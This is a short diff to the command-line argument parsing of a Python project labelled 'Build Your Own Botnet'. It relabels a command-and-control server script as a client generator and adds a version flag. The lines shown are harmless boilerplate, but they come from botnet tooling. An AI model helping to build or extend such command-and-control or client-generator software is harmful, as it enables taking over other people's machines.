@@ -62,9 +62,9 @@ __banner__ = """
 def main():
 
     parser = argparse.ArgumentParser(
-        prog='server.py',
-        version='0.1.5',
-        description="Command & Control Server (Build Your Own Botnet)")
+        prog='client.py',
+        description="Generator (Build Your Own Botnet)"
+    )
 
     parser.add_argument(
         '--host',
@@ -109,6 +109,12 @@ def main():
         '--debug',
         action='store_true',
         help='Additional logging'
+    )
+
+    parser.add_argument(
+        '-v', '--version',
+        action='version',
+        version='0.2',
     )
 
     modules = os.path.abspath('modules')
